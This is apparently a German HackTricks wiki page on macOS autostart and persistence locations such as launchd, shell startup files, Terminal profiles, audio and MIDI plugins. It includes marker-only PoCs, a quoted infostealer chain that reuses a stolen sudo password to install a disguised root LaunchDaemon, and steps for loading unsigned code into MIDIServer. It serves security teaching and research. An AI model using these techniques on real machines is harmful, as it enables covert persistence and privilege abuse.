# macOS-Autostart

{{#include ../banners/hacktricks-training.md}}

Dieser Abschnitt basiert größtenteils auf der Blogserie [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Ziel ist es, Orte zu identifizieren, an denen das Schreiben einer Datei später zur Codeausführung führen kann, welches Ereignis die Ausführung auslöst und welche Berechtigungen erforderlich sind. Dass ein Ort vorhanden ist, beweist nicht, dass der Mechanismus aktiviert ist. Die unten genannten lokalen Prüfungen wurden unter macOS 26.5.2 (5. Oktober 2026) durchgeführt; sie belegen nicht das Verhalten jeder macOS-Version.

> [!NOTE]
> „Durch Schreiben ausgelöst“ bedeutet nicht immer „wird unmittelbar nach dem Schreiben ausgeführt“. Manche Orte werden erst bei der Anmeldung, beim Start einer bestimmten Anwendung oder bei einer Benutzeraktion ausgelesen. Ein beschreibbarer Payload innerhalb eines bereits konfigurierten Jobs ist außerdem nicht dasselbe wie die Berechtigung, einen neuen Job zu registrieren. Teste eine Technik, bevor du dich darauf verlässt, in einem Wegwerf-Account oder einer VM.

## Sandbox-Bypass

> [!TIP]
> Hier findest du Startorte, die für einen **Sandbox-Bypass** nützlich sind und es dir ermöglichen, etwas auszuführen, indem du es einfach **in eine Datei schreibst** und auf eine sehr **übliche** **Aktion**, eine festgelegte **Zeitspanne** oder eine **Aktion wartest, die du normalerweise ausführen kannst**, während du dich in einer Sandbox befindest, ohne Root-Berechtigungen zu benötigen.

### Launchd

- Nützlich für Sandbox-Bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Orte

- **`/Library/LaunchAgents`**
  - **Auslöser**: Benutzeranmeldung (oder explizite Registrierung)
  - Root erforderlich
- **`/Library/LaunchDaemons`**
  - **Auslöser**: Systemstart (oder explizite Registrierung)
  - Root erforderlich
- **`/System/Library/LaunchAgents`**
  - **Auslöser**: Benutzeranmeldung; geschützter Apple-Systemort
- **`/System/Library/LaunchDaemons`**
  - **Auslöser**: Systemstart; geschützter Apple-Systemort
- **`~/Library/LaunchAgents`**
  - **Auslöser**: Erneute Anmeldung

Es gibt keinen von `launchd` gescannten Speicherort `~/Library/LaunchDaemons`. Jobs pro Benutzer gehören in `~/Library/LaunchAgents`; das System-Daemon-Verzeichnis ist `/Library/LaunchDaemons`. [Apples launchd-Startanleitung](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) dokumentiert die gescannten Speicherorte.

> [!TIP]
> Eine interessante Tatsache: **`launchd`** enthält eine eingebettete Property List im Mach-o-Abschnitt `__Text.__config`, die weitere bekannte Dienste enthält, die launchd starten muss. Außerdem können diese Dienste `RequireSuccess`, `RequireRun` und `RebootOnSuccess` enthalten. Das bedeutet, dass sie ausgeführt werden und erfolgreich abgeschlossen werden müssen.
>
> Natürlich kann sie aufgrund der Code-Signierung nicht geändert werden.

#### Beschreibung & Exploitation

**`launchd`** ist der **erste** Prozess, der beim Start vom OS-X-Kernel ausgeführt wird, und der letzte, der beim Herunterfahren beendet wird. Er sollte immer die **PID 1** haben. Dieser Prozess **liest die Konfigurationen aus und führt sie aus**, die in den **ASEP**-**Plists** angegeben sind unter:

- `/Library/LaunchAgents`: Vom Administrator installierte Agents pro Benutzer
- `/Library/LaunchDaemons`: Vom Administrator installierte systemweite Daemons
- `/System/Library/LaunchAgents`: Von Apple bereitgestellte Agents pro Benutzer.
- `/System/Library/LaunchDaemons`: Von Apple bereitgestellte systemweite Daemons.

Wenn sich ein Benutzer anmeldet, lädt `launchd` die Plists aus dem Verzeichnis `~/Library/LaunchAgents` dieses Benutzers mit dessen Berechtigungen. Jobs werden entsprechend ihren Schlüsseln gestartet; das bloße Laden einer Plist bedeutet nicht, dass ein Prozess sofort ausgeführt wird.

Der **Hauptunterschied zwischen Agents und Daemons besteht darin, dass Agents beim Anmelden des Benutzers geladen werden und Daemons beim Systemstart** (da Dienste wie ssh ausgeführt werden müssen, bevor ein Benutzer auf das System zugreift). Agents können außerdem eine GUI verwenden, während Daemons im Hintergrund ausgeführt werden müssen.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Jedes Element von `ProgramArguments` ist ein separates Argument; `launchd` interpretiert keine einzelne Zeichenfolge als Shell-Befehl. Das oben korrigierte Beispiel lässt sich mit `plutil -lint /path/to/example.plist` auf Syntaxfehler prüfen, ohne es zu laden. Weitere Informationen zu `ProgramArguments`, `RunAtLoad` und `KeepAlive` finden Sie im lokalen Eintrag `man launchd.plist`.

#### Datei-Ereignis-Trigger in vorhandenen Jobs

Ein **bereits geladener** Agent oder Daemon kann `WatchPaths` verwenden, um beim Ändern eines benannten Pfads zu starten. `QueueDirectories` startet einen Job, solange ein Verzeichnis nicht leer ist; `StartOnMount` startet ihn beim Einhängen eines Volumes. [Apples Anleitung zu launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) enthält Beispiele für `WatchPaths` und `QueueDirectories`. Ein Schreibvorgang in eine überwachte Datei löst den **bereits konfigurierten Job** aus; beliebige Codeausführung ist nur möglich, wenn der Schreibende auch die ausführbare Datei, das Skript oder die vom Job interpretierten Daten kontrollieren kann. Das bloße Schreiben einer neuen plist-Datei außerhalb eines überwachten oder registrierten Speicherorts lädt sie nicht.

Dieser selbstbereinigende PoC registriert einen eindeutig benannten **temporären Benutzeragenten**, ändert nur die eigene überwachte Datei und entfernt den Agenten. Er wurde unter macOS 26.5.2 erfolgreich und ohne Abmeldung oder Neustart ausgeführt:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Der lokale Lauf gab `watch fired: True` aus, und `bootout` war erfolgreich. `launchctl bootstrap` wird hier nur innerhalb des isolierten PoC verwendet; für einen bereits geladenen Job ist es **nicht** erforderlich. Um einen bestehenden Job sicher zu überprüfen, lies dessen plist und den aufgelösten Pfad in `ProgramArguments` aus. Prüfe anschließend, ob die betreffende ausführbare Datei oder interpretierte Datei beschreibbar ist, ohne sie zu verändern.

Es gibt Fälle, in denen ein **Agent ausgeführt werden muss, bevor sich der Benutzer anmeldet**. Diese werden **PreLoginAgents** genannt. Das ist beispielsweise nützlich, um beim Anmelden assistive Technologie bereitzustellen. Sie sind auch in `/Library/LaunchAgents` zu finden (siehe [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

> [!TIP]
> Neue Konfigurationsdateien für Daemons oder Agents werden **nach dem nächsten Neustart oder mithilfe von** `launchctl load <target.plist>` **geladen**. Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung zu laden**: `launchctl -F <file>` (diese plist-Dateien werden jedoch nach einem Neustart nicht automatisch geladen).\
> Es ist auch möglich, sie mit `launchctl unload <target.plist>` **zu entladen** (der dadurch angegebene Prozess wird beendet),
>
> Um **sicherzustellen**, dass **nichts** (wie etwa ein Override) **verhindert**, dass ein **Agent** oder **Daemon** **ausgeführt wird**, führe Folgendes aus: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Liste alle Agents und Daemons auf, die vom aktuellen Benutzer geladen wurden:

```bash
launchctl list
```

#### Beispiel einer bösartigen LaunchDaemon-Kette (Passwort-Wiederverwendung)

Ein aktueller macOS-Infostealer verwendete ein **abgefangenes sudo-Passwort** erneut, um einen User Agent und einen Root-LaunchDaemon abzulegen:<sup>[[1]](#references)</sup>

- Schreibe die Agent-Schleife nach `~/.agent` und mache sie ausführbar.
- Erzeuge eine plist unter `/tmp/starter`, die auf diesen Agent verweist.
- Verwende das gestohlene Passwort erneut mit `sudo -S`, um sie nach `/Library/LaunchDaemons/com.finder.helper.plist` zu kopieren, setze `root:wheel` und lade sie mit `launchctl load`.
- Starte den Agent unauffällig mit `nohup ~/.agent >/dev/null 2>&1 &`, um die Ausgabe abzutrennen.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Ein Daemon-plist in `/Library/LaunchDaemons` wird nicht dadurch sicher, dass ihm ein Benutzer als Eigentümer zugewiesen wird. `launchd` verlangt für Systemjobs geeignete Eigentümer- und Berechtigungseinstellungen und kann ein unsicheres plist ablehnen. Ein Daemon mit Root als Eigentümer läuft normalerweise als Root, sofern seine Konfiguration kein anderes Konto auswählt. Prüfe den `UserName`- und `GroupName`-Eintrag, die Eigentümer- und Berechtigungseinstellungen sowie die `launchctl`-Diagnosemeldungen; leite die Ausführungsidentität nicht allein aus dem Namen des plist-Eigentümers ab.

#### Weitere Informationen zu launchd

**`launchd`** ist der **erste** Prozess im Benutzermodus, der vom **Kernel** gestartet wird. Der Prozessstart muss **erfolgreich** sein und der Prozess **darf nicht beendet werden oder abstürzen**. Er ist sogar gegen einige **Beendigungssignale geschützt**.

Eines der ersten Dinge, die `launchd` tut, ist, alle **Daemons** zu **starten**, zum Beispiel:

- **Timer-Daemons**, die zeitgesteuert ausgeführt werden:
  - `com.apple.atrun.plist` ruft unter macOS 26.5.2 `/usr/libexec/atrun` mit `StartInterval = 30` Sekunden auf; der tatsächlich aktivierte Zustand kann vom Wert des plist-Schlüssels `Disabled` abweichen, da `launchd` Überschreibungen separat speichert.
  - `com.vix.cron.plist` ruft `/usr/sbin/cron` auf, wenn `/usr/lib/cron/tabs` Jobs enthält. `com.apple.systemstats.daily` ist ein anderer geplanter Dienst, nicht der cron-Daemon.
- **Netzwerk-Daemons** wie:
  - `org.cups.cups-lpd`: Lauscht über TCP (`SockType: stream`) mit `SockServiceName: printer`
    - `SockServiceName` muss entweder ein Port oder ein in `/etc/services` aufgeführter Dienst sein.
  - `com.apple.xscertd.plist`: Lauscht über TCP an Port 1640.
- **Pfad-Daemons**, die bei einer Änderung eines angegebenen Pfads ausgeführt werden:
  - `com.apple.postfix.master`: Überwacht den Pfad `/etc/postfix/aliases`.
- **IOKit-Benachrichtigungs-Daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-Port:**
  - `com.apple.xscertd-helper.plist`: Der Eintrag `MachServices` enthält den Namen `com.apple.xscertd.helper`.
- **UserEventAgent:**
  - Dieser unterscheidet sich vom vorherigen Beispiel. Er veranlasst `launchd`, als Reaktion auf bestimmte Ereignisse Apps zu starten. In diesem Fall ist die Haupt-Binärdatei jedoch nicht `launchd`, sondern `/usr/libexec/UserEventAgent`. Sie lädt Plugins aus dem durch SIP eingeschränkten Ordner `/System/Library/UserEventPlugins/`. Jedes Plugin gibt seinen Initialisierer im Schlüssel `XPCEventModuleInitializer` an oder – bei älteren Plugins – im `CFPluginFactories`-Dict unter dem Schlüssel `FB86416D-6164-2070-726F-70735C216EC0` in seiner `Info.plist`.

### Shell-Startdateien

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dafür musst du aber eine App mit einem TCC-Bypass finden, die eine Shell ausführt, welche diese Dateien lädt.

#### Speicherorte

- **`~/.zshenv`** (oder eine neuere kompilierte Datei **`~/.zshenv.zwc`**)
  - **Auslöser**: Jeder gewöhnliche zsh-Aufruf, einschließlich eines nicht interaktiven `zsh -c`; `zsh -f` überspringt die benutzerspezifischen Startdateien.
- **`~/.zshrc`**
  - **Auslöser**: Eine interaktive zsh-Shell wird gestartet.
- **`~/.zprofile`, `~/.zlogin`**
  - **Auslöser**: Eine Login-zsh-Shell wird gestartet; diese Dateien werden vor beziehungsweise nach `.zshrc` gelesen.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Auslöser**: Ein Terminal mit zsh öffnen.
  - Root erforderlich.
- **`~/.zlogout`**
  - **Auslöser**: Eine Login-zsh-Shell wird regulär beendet, nicht bei jedem Beenden eines Terminals oder einer Shell.
- **`/etc/zlogout`**
  - **Auslöser**: Ein Terminal mit zsh beenden.
  - Root erforderlich.
- Möglicherweise weitere Informationen unter: **`man zsh`**
- **`~/.bashrc`**
  - **Auslöser**: Eine interaktive **Nicht-Login**-Bash starten. Eine interaktive Login-Bash liest diese Datei nur, wenn eine Login-Datei sie ausdrücklich einbindet.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Auslöser**: Eine Login-Bash starten; die erste lesbare Datei in dieser Reihenfolge wird ausgeführt. `~/.profile` wird übersprungen, wenn eine der beiden vorherigen Dateien existiert.
- **`/etc/profile`**
  - **Auslöser**: Eine Login-Bash starten; zum Ändern ist Root erforderlich.
- **`~/.tcshrc`** oder, falls nicht vorhanden, **`~/.cshrc`**
  - **Auslöser**: `tcsh` starten, einschließlich eines nicht interaktiven `tcsh -c` auf diesem Mac. Der Benutzer muss tatsächlich `tcsh` aufrufen; es ist nicht die standardmäßige macOS-Shell.
- **`~/.login`**
  - **Auslöser**: Eine Login-`tcsh` nach ihrer rc-Datei starten.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Auslöser**: Es wird erwartet, dass diese Dateien mit xterm ausgelöst werden; xterm ist jedoch **nicht installiert**. Und selbst nach der Installation erscheint dieser Fehler: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Beschreibung und Ausnutzung

Beim Starten einer Shell-Umgebung wie `zsh` oder `bash` werden **bestimmte Startdateien ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standard-Shell. Ob Terminal oder SSH eine Login- oder interaktive Shell startet, hängt von der jeweiligen Konfiguration ab; gehe nicht davon aus, dass in jeder Sitzung alle oben aufgeführten Dateien ausgeführt werden. `bash` und `sh` sind zwar ebenfalls unter macOS vorhanden, müssen aber ausdrücklich aufgerufen werden, um sie zu verwenden.<sup>[[2]](#references)</sup> Die [Referenz zu zsh-Startdateien](https://zsh.sourceforge.io/Doc/Release/Files.html) beschreibt die Reihenfolge, die `ZDOTDIR`-Überschreibung und die `.zwc`-Regel.

Das folgende schreibgeschützte Experiment wurde unter macOS 26.5.2 mit einem temporären `ZDOTDIR` durchgeführt. Es zeigt, welche Benutzerdateien gelesen wurden; keine echten Shell-Startdateien wurden geändert:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Die beobachtete Reihenfolge war `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` muss bereits auf das alternative Verzeichnis zeigen; Dateien einfach in einem beliebigen Verzeichnis abzulegen, reicht nicht aus.

[Bashs Startup-Referenz](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) unterscheidet zwischen Login- und interaktiven Shells. Auf dem macOS-26.5.2-Testrechner ergab ein isoliertes `HOME` mit allen vier Benutzer-Startup-Dateien Folgendes: `bash -c` → keine, `bash -ic` → `.bashrc`, `bash -lc` und `bash -lic` → nur `.bash_profile`. Wurde `.bash_profile` entfernt, las Login-Bash `.bash_login` und nach dessen Entfernung `.profile`. `BASH_ENV` kann nichtinteraktive Bash auf eine Datei verweisen lassen, aber diese Umgebungsvariable muss bereits im aufrufenden Prozess gesetzt sein. Ein explizites `exit` aus einer Login-Bash kann außerdem `~/.bash_logout` laden.

Das lokale `tcsh(1)`-Handbuch dokumentiert eine separate Startup-Reihenfolge. Mit einem temporären `HOME` las `/bin/tcsh -c :` `.tcshrc` oder, falls `.tcshrc` fehlte, `.cshrc`. Eine temporäre Login-`tcsh` las `.tcshrc` und `.login`. Bei diesen Tests wurden nur temporäre Dateien erstellt und entfernt.

### Erneut geöffnete Apps

> [!CAUTION]
> Das Konfigurieren der angegebenen Ausnutzung und anschließende Ab- und wieder Anmelden oder sogar ein Neustart führten beim Test nicht dazu, dass die App ausgeführt wurde. Die App muss möglicherweise während dieser Aktionen laufen.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Auslöser**: Neustart, bei dem Apps wieder geöffnet werden

#### Beschreibung und Ausnutzung

Alle erneut zu öffnenden Apps befinden sich in der plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Damit die Apps, die erneut geöffnet werden, deine eigene starten, musst du sie einfach **zur Liste hinzufügen**.

Die UUID lässt sich durch Auflisten dieses Verzeichnisses oder mit `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` ermitteln.

Um zu überprüfen, welche Apps erneut geöffnet werden, kannst du Folgendes ausführen:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Um **eine Anwendung zu dieser Liste hinzuzufügen**, können Sie Folgendes verwenden:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal verwendet die FDA-Berechtigungen des Benutzers, der es nutzt

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Trigger**: Ein neues Terminal-Fenster oder einen neuen Tab mit dem Profil öffnen, dessen Shell-Einstellungen den Startbefehl enthalten

#### Description & Exploitation

In **`~/Library/Preferences`** werden die Einstellungen der Anwendungen des Benutzers gespeichert. Einige dieser Einstellungen können eine Konfiguration enthalten, um **andere Anwendungen/Skripte auszuführen**.<sup>[[5]](#references)</sup>

Zum Beispiel kann Terminal beim Start einen Befehl ausführen:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration wird folgendermaßen in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** abgebildet:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Wenn das betreffende Profil einen Startbefehl enthält und Terminal diese Einstellung liest, kann eine neue Sitzung mit diesem Profil den Befehl ausführen. Im [aktuellen Terminal-Handbuch von Apple](https://support.apple.com/guide/terminal/trmlshll/mac) wird der profilbezogene Befehl unter **Shell → Startup** beschrieben. Terminal einfach zu öffnen, ohne eine neue Sitzung mit diesem Profil zu starten, reicht nicht aus. Die unten aufgeführten Einstellungsänderungen wurden auf dem Forschungs-Mac **nicht** vorgenommen.

Du kannst dies über die CLI hinzufügen:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- Nützlich zum Bypass der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal verwenden, um die FDA-Berechtigungen des Benutzers zu erhalten, der es verwendet

#### Speicherort

- **Beliebig**
  - **Auslöser**: Die betreffende `.terminal`-, `.command`- oder `.tool`-Datei öffnen

#### Beschreibung & Ausnutzung

Wenn ein Benutzer eine **`.terminal`**-Einstellungsdatei öffnet, kann Terminal anhand ihres Profils eine Sitzung erstellen; ausführbare **`.command`**- und **`.tool`**-Dateien können ebenfalls in Terminal geöffnet werden. Dies ist ein expliziter Auslöser beim Öffnen einer Datei und keine Ausführung, die allein durch das Öffnen von Terminal erfolgt. Ein eventuell übernommener TCC-Zugriff hängt von den tatsächlichen Berechtigungen von Terminal und dem ausgeführten Vorgang ab. Das historische Beispiel unten wurde nicht auf dem Forschungs-Mac ausgeführt.

Versuche es mit:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Du könntest auch die Erweiterungen **`.command`** und **`.tool`** mit regulären Shell-Skripten verwenden; sie werden ebenfalls von Terminal geöffnet.

> [!CAUTION]
> Wenn Terminal **Full Disk Access** hat, kann es diese Aktion ausführen (beachte, dass der ausgeführte Befehl in einem Terminalfenster sichtbar ist).

### Audio-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Möglicherweise erhältst du zusätzlichen TCC-Zugriff

#### Speicherort

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root erforderlich
  - **Auslöser**: Der Core Audio-Server lädt ein kompatibles HAL-Geräte-Plugin; ein Neustart des Servers kann eine erneute Erkennung auslösen
- **`/Library/Audio/Plug-ins/Components`**
  - Root erforderlich
  - **Auslöser**: Ein Audio-Host erkennt die installierte Audio Unit und instanziiert sie
- **`~/Library/Audio/Plug-ins/Components`**
  - **Auslöser**: Ein Audio-Host erkennt die installierte Audio Unit und instanziiert sie
- **`/System/Library/Components`**
  - Von Apple bereitgestellter, systemgeschützter Speicherort
  - **Auslöser**: Ein Audio-Host instanziiert eine passende Systemkomponente

#### Beschreibung

Laut den vorherigen Writeups ist es möglich, **einige Audio-Plugins zu kompilieren** und laden zu lassen.<sup>[[6]](#references)[[7]](#references)</sup>

HAL-Geräte-Plugins und Audio Units werden auf unterschiedlichen Wegen geladen. In [Apples Anleitung zum Hosten von Audio Units](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) heißt es, dass ein Host eine Komponente finden und instanziieren muss; sie in ein Verzeichnis für die Suche zu kopieren oder `coreaudiod` neu zu starten, beweist allein nicht, dass sie ausgeführt wird. AUv2-Plugins laufen im Host-Prozess, während [Apples aktuelle Anleitung zu Audio Units](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) besagt, dass AUv3 unter macOS standardmäßig in einem separaten Prozess ausgeführt wird. Die Anforderungen an Signatur, sandbox und Library Validation hängen vom Host ab. Auf dem Forschungs-Mac wurde kein Audio-Plugin installiert oder ausgeführt.

### CoreMIDI-Treiber (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Dein Code läuft im `MIDIServer`-Prozess, nicht in der sandbox deiner App
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` läuft mit einem eigenen `seatbelt`-sandbox-Profil

#### Speicherort

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Kein Root erforderlich (vom Benutzer beschreibbar)
  - **Auslöser**: `MIDIServer` wird gestartet oder neu gestartet. Er wird bei Bedarf gestartet, wenn ein Prozess CoreMIDI zum ersten Mal verwendet (beim Öffnen von *Audio MIDI Setup*, GarageBand, einer DAW oder einer Seite, die WebMIDI nutzt)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root erforderlich
  - **Auslöser**: Wie oben

#### Beschreibung & Ausnutzung

Apples `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) lädt MIDI-**Treiber**-Bundles aus den Verzeichnissen `Audio/MIDI Drivers`. Die Binärdatei ist von Apple signiert, enthält aber die Berechtigung `com.apple.security.cs.disable-library-validation`. Dadurch lädt sie ein Bundle, das **unsigniert oder ad-hoc von einem anderen Team signiert** ist, und ermöglicht so die Codeausführung in einem separaten, Apple-eigenen Prozess **ohne Root**.<sup>[[53]](#references)</sup>

Auf macOS 26 verifiziert (nur lesend):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Ein Driver ist ein standardmäßiges Bundle, das eine `MIDIDriverInterface`-Factory exportiert. Wenn du die Payload in die Factory/den Konstruktor legst, wird sie ausgeführt, sobald `MIDIServer` die Driver aufzählt. Baue es, lege es unter `~/Library/Audio/MIDI Drivers/Evil.plugin` ab und löse einen Ladevorgang aus, ohne dich abzumelden oder neu zu starten:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
  - Möglicherweise erhältst du zusätzlichen TCC-Zugriff

#### Speicherort

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung & Ausnutzung

